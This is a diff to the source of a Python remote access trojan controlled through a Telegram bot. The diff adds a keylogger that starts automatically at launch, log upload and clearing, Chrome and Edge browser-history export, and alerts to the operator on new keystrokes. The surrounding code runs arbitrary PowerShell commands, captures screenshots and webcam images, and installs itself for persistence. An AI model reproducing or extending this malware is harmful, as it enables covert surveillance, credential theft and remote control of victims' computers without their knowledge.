@@ -2,7 +2,7 @@
 import os
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 import telegram
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, JobQueue
 import flag
 import pyperclip
 import subprocess
@@ -27,8 +27,12 @@ from Modules import (
     open_website,
     file_mgmt,
     startup,
-    task_kill
+    task_kill,
+    browser_history_export,
+    keylogger
 )
+import locale
+import asyncio
 
 
 boot_time = datetime.datetime.now()
@@ -49,7 +53,6 @@ def listToString(s):
 
 async def main_menu(update: Update, context):
     keyboard = [
-        [InlineKeyboardButton("🔗 https://github.com/infermiere", callback_data="git_hub")],
         [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
         [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
         [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
@@ -102,6 +105,9 @@ async def main_menu(update: Update, context):
                 "📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints"
             )
         ],
+        [InlineKeyboardButton("🕑 Export Browser History", callback_data="export_browser_history")],
+        [InlineKeyboardButton("⌨️ Get Keylogger Log", callback_data="get_keylog")],
+        [InlineKeyboardButton("🟢 Enable Keylogger", callback_data="enable_keylogger"), InlineKeyboardButton("🔴 Disable Keylogger", callback_data="disable_keylogger")],
     ]
 
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -217,8 +223,9 @@ async def shell_commands(update, context):
         f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE
     )
     try:
+        encoding = locale.getpreferredencoding()
         await application.bot.send_message(
-            chat_id=chat_id, text=cmd_output.stdout.read().decode(sys.stdout.encoding)
+            chat_id=chat_id, text=cmd_output.stdout.read().decode(encoding, errors='replace')
         )
     except telegram.error.BadRequest:
         await application.bot.send_message(
@@ -268,10 +275,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text="To see the uptime, use /uptime",
         )
     elif result == "git_hub":
-        await application.bot.send_message(
-            chat_id=chat_id,
-            text="🔗 https://github.com/infermiere\n💬 @primogirone",
-        )
+        pass
     elif result == "get_system_info":
 
         sys_info = system_info.system_info()
@@ -411,6 +415,93 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=chat_id,
             text="To send file, use /get_file <file path>",
         )
+
+    elif result == "export_browser_history":
+        # Запросить у пользователя выбор браузера
+        keyboard = [
+            [InlineKeyboardButton("Google Chrome", callback_data="export_history_chrome")],
+            [InlineKeyboardButton("Microsoft Edge", callback_data="export_history_edge")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await application.bot.send_message(
+            chat_id=chat_id,
+            text="Выберите браузер для экспорта истории:",
+            reply_markup=reply_markup
+        )
+    elif result == "export_history_chrome" or result == "export_history_edge":
+        browser = "chrome" if result == "export_history_chrome" else "edge"
+        await application.bot.send_message(chat_id=chat_id, text=f"Экспортирую историю браузера {browser.title()}...")
+        try:
+            path = browser_history_export.export_history(browser)
+            await application.bot.send_document(chat_id=chat_id, document=open(path, "rb"), caption=f"History ({browser})")
+            os.remove(path)
+        except Exception as e:
+            await application.bot.send_message(chat_id=chat_id, text=f"Ошибка экспорта: {e}")
+
+    elif result == "get_keylog":
+        keyboard = [
+            [InlineKeyboardButton("Выгрузить лог", callback_data="keylog_download")],
+            [InlineKeyboardButton("Очистить лог", callback_data="keylog_clear")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await application.bot.send_message(
+            chat_id=chat_id,
+            text="Что сделать с логом кейлоггера?",
+            reply_markup=reply_markup
+        )
+    elif result == "keylog_download":
+        import os
+        log_path = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
+        if os.path.exists(log_path):
+            await application.bot.send_document(chat_id=chat_id, document=open(log_path, "rb"), caption="Keylogger log")
+        else:
+            await application.bot.send_message(chat_id=chat_id, text="Keylogger log file not found.")
+    elif result == "keylog_clear":
+        import os
+        log_path = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
+        with open(log_path, 'w', encoding='utf-8') as f:
+            f.truncate(0)
+        await application.bot.send_message(chat_id=chat_id, text="Keylogger log очищен.")
+
+    elif result == "enable_keylogger":
+        keylogger.start_keylogger()
+        await application.bot.send_message(chat_id=chat_id, text="Keylogger enabled.")
+    elif result == "disable_keylogger":
+        if hasattr(keylogger, 'keylogger_instance') and hasattr(keylogger.keylogger_instance, 'listener'):
+            try:
+                keylogger.keylogger_instance.listener.stop()
+                await application.bot.send_message(chat_id=chat_id, text="Keylogger disabled.")
+            except Exception:
+                await application.bot.send_message(chat_id=chat_id, text="Keylogger was not running or already stopped.")
+        else:
+            await application.bot.send_message(chat_id=chat_id, text="Keylogger was not running or already stopped.")
+
+NOTIFY_KEYLOG_ACTIVITY_GAP_SEC = 30  # 30 секунд
+async def notify_on_keylog_activity_job(context):
+    import os
+    from datetime import datetime
+    log_path = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
+    job_data = context.job.data
+    if 'last_ts' not in job_data:
+        job_data['last_ts'] = None
+        job_data['notified'] = False
+    with open(log_path, 'r', encoding='utf-8') as f:
+        first = f.readline()
+        if first.startswith('LAST_TIMESTAMP: '):
+            ts_str = first.strip().split('LAST_TIMESTAMP: ')[-1]
+            try:
+                ts = datetime.strptime(ts_str, '%Y-%m-%d %H:%M:%S')
+            except Exception:
+                return
+            now = datetime.now()
+            gap = (now - ts).total_seconds()
+            if job_data['last_ts'] and not job_data['notified'] and (now - job_data['last_ts']).total_seconds() > NOTIFY_KEYLOG_ACTIVITY_GAP_SEC and gap < 60:
+                await context.application.bot.send_message(chat_id=chat_id, text="⚡️ Обнаружена новая активность на клавиатуре!")
+                job_data['notified'] = True
+            if gap < 60:
+                job_data['last_ts'] = now
+                job_data['notified'] = False
+
 def send_message(token, chat_id, message):
     
     response = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': chat_id,'text': message}, headers={'Content-Type': 'application/json'})
@@ -420,7 +511,7 @@ def send_message(token, chat_id, message):
     else:
         pass
 def start_bot():
-    send_message(api_key, chat_id, "☠️ " + username + " Connected to " + cfg.rat_name + "\n\n🙊/start")
+    send_message(api_key, chat_id, "☠️ " + username + " Connected to " + cfg.rat_name + "\n\n/start")
 
     application.add_handler(CommandHandler("start", main_menu))
 
@@ -454,6 +545,8 @@ def is_first_run():
         return True
 
 def main():
+    keylogger.start_keylogger()
+    application.job_queue.run_repeating(notify_on_keylog_activity_job, interval=10, first=10, data={})
     if is_first_run():
         target_path = startup.copy_to_user_folder()
         if target_path:
